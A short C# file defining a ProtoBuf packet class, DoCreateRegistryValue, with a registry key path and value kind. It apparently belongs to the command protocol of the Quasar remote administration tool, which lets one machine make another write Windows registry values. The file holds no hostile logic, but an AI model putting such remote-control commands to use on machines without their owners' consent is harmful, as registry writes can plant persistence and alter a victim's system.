using Microsoft.Win32;
using ProtoBuf;

namespace Quasar.Common.Packets
{
    [ProtoContract]
    public class DoCreateRegistryValue : IPacket
    {
        [ProtoMember(1)]
        public string KeyPath { get; set; }

        [ProtoMember(2)]
        public RegistryValueKind Kind { get; set; }
    }
}
